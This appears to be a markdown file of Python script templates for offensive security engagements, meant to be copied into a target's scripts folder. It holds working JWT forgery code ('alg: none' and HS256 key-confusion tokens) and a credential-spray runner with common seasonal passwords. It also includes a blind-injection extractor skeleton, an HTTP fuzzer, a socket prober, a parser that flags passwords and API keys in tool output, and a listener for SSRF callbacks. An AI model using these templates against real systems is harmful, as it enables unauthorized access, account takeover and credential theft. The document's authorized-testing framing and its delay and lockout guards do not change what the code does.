# Script Templates — Starting Blocks for the Forge

Copy a template into `artifacts/<target>/scripts/`, rename, adapt the marked
`### MISSION` block. All stdlib-only, each has timeout + dry-run + summary.

---

## T1 — HTTP Probe / Fuzzer Harness

```python
#!/usr/bin/env python3
import argparse, json, time, urllib.request, urllib.error

def req(url, method="GET", data=None, headers=None, timeout=10):
    r = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace"), time.time()-t0
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), time.time()-t0
    except Exception as e:
        return -1, repr(e), time.time()-t0

### MISSION: define candidates + comparator
CANDIDATES = [...]   # list of urls/payloads
def interesting(status, body, elapsed) -> bool:
    return status == 200  # <-- adjust per mission

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--delay", type=float, default=0.3)
    a = ap.parse_args()
    results, hits = [], []
    for c in CANDIDATES:
        if a.dry_run:
            print("DRY", c); continue
        s, b, el = req(c)
        results.append((c, s, el))
        if interesting(s, b, el): hits.append({"target": c, "status": s, "ms": round(el*1000)})
        time.sleep(a.delay)
    print(json.dumps({"proven": len(hits), "leads": hits}))
    # caller redirects stdout into artifacts/.../probe.jsonl
```

## T2 — Blind Oracle Extractor (boolean + timing)

```python
### MISSION: binary-search a value through an oracle endpoint
TRUE_MARK = ...   # observable that distinguishes TRUE (status/body len/regex)
def oracle(payload) -> bool: ...        # call target, apply TRUE_MARK
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_- "

def extract(prefix_query, len_probe, value_probe, max_len=64):
    # 1) length via len_probe(n): oracle(f"...len(x)>{n}...")
    # 2) chars via value_probe: oracle(f"...substr(x,{i},1)='{c}'...")
    # 3) log every round to jsonl so the run is replayable
```
Rules: single operator account, delay between requests, hash final value in log.

## T3 — Raw Socket Prober (banner / TCP / UDP)

```python
import socket
def probe(host, port, payload=b"\r\n", timeout=6, proto="tcp"):
    fam, typ = (socket.AF_INET, socket.SOCK_STREAM) if proto=="tcp" else (
                socket.AF_INET, socket.SOCK_DGRAM)
    with socket.socket(fam, typ) as s:
        s.settimeout(timeout); s.connect((host, port)) if proto=="tcp" else None
        if payload: s.send(payload)
        try: data = s.recv(4096)
        except socket.timeout: data = b""
    return data.decode(errors="replace")
```
Use for: banner grab, SMTP relay probe, protocol fingerprint confirm.

## T4 — Tool Output Parser → leads.md

```python
import json, re
PATTERNS = {  # regex -> severity
    r"pass(word|wd|)": "high", r"api[_-]?key": "high",
    r"(?i)admin": "med", r"\b(20[01])\b": "info",    # status codes
}
def parse(path):
    for line in open(path, encoding="utf-8", errors="replace"):
        for pat, sev in PATTERNS.items():
            m = re.search(pat, line)
            if m: yield {"match": m.group(0), "severity": sev, "source_line": line[:200]}
```
Chain: `nmap/whatweb/nuclei output → T4 → artifacts/<t>/leads.md`.

## T5 — JWT Tamper / Replay Kit

```python
import base64, json, hmac, hashlib
def b64d(s): return base64.urlsafe_b64decode(s + "==" * (-len(s) % 4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def none_token(header, claims):
    h = b64e(json.dumps(header).encode()); p = b64e(json.dumps(claims).encode())
    return f"{h}.{p}."                    # alg:'none' variant

def hs256_confusion(header, claims, pubkey_pem):
    payload = (b64e(header) + "." + b64e(claims)).encode()
    sig = hmac.new(pubkey_pem, payload, hashlib.sha256).digest()
    return b64e(header) + "." + b64e(claims) + "." + b64e(sig)
```
Pair with T1 to fire tampered tokens at the auth endpoint.

## T6 — Credential Spray Runner (LOCKOUT-SAFE)

```python
### every cycle: ONE password across users, then mandatory cool-down
CYCLE = ["Summer2024!", "Winter2024!", "Spring2025!"]
LOCKOUT_GUARD = 15 * 60        # seconds between cycles — never 0
def spray(cycle_i): ...        # calls login for each user w/ T1.req
```
Hard-coded guard; script refuses `--delay 0`.

## T7 — Webhook / OOB Listener (operator-owned)

```python
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        open("oob_hits.jsonl", "a").write(json.dumps({
            "ts": time.time(), "path": self.path,
            "headers": dict(self.headers), "ip": self.client_address}) + "\n")
        self.send_response(200); self.end_headers()
# run: python T7.py --port 9099  → point SSRF/OOB probes at this listener
```
Only ever binds to operator IP; single engagement lifetime.
